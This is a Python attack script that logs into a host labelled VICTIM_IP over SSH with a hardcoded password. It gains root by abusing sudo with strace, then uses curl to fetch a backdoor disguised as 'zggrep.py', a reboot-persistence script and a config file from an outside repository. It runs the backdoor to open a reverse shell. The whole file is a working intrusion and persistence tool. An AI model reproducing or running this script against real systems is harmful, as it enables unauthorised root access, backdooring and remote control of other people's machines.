# start_script.py
import subprocess, paramiko, config, time

hostname = config.VICTIM_IP
port = 22
username = "user"
password = "hill"
repo_path = config.REPO_PATH

# Initialize the SSH client
client = paramiko.SSHClient()

# Automatically add the server's host key (useful for automation, though less strict)
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

try:
    # Connect to the server
    client.connect(hostname, port=port, username=username, password=password)
    shell = client.invoke_shell()
    
    print("Connected to host")
    
    time.sleep(1)
    if shell.recv_ready():
        shell.recv(65535)
        
    # perform root escalation
    shell.send(b"sudo /bin/strace -o /dev/null /bin/bash -p\n")
        
    time.sleep(2)
    
    shell.send(b"cd ../../bin\n")
    time.sleep(1)
    
    shell.send(b"cd zggrep\n")   
    time.sleep(1)
    
    # get backdoor
    backdoor_link = f"{repo_path}/main/client.py\n"
    shell.send((f"curl -o zggrep.py {backdoor_link}").encode())
    print("Downloading backdoor...")
    time.sleep(1)
    output = ""
    while shell.recv_ready():
        output += shell.recv(4096).decode("utf-8")     
    print(output)
    
    # get backdoor
    reboot_link = f"{repo_path}/main/start_on_reboot.py\n"
    shell.send((f"curl -o boot.py {reboot_link}").encode())
    print("Downloading reboot script...")
    time.sleep(1)
    output = ""
    while shell.recv_ready():
        output += shell.recv(4096).decode("utf-8")     
    print(output)
    
    # get config
    config_link = f"{repo_path}/main/config.py\n"
    shell.send((f"curl -O {config_link}").encode())
    print("Downloading config file...")
    time.sleep(1)
    output = ""
    while shell.recv_ready():
        output += shell.recv(4096).decode("utf-8")     
    print(output)
    
    shell.send(b"python zggrep.py\n")
    
    print("Payload has run, use the listening terminal to access host.")
    while True:
        user_input = input("Type 'exit' to close reverse shell: ")
    
        if user_input.strip().lower() == 'exit':
            print("Closing program...")
            break
        else:
            print(f"You typed: {user_input}")
    
finally:
    # close the connection
    shell.close()
    client.close()
    

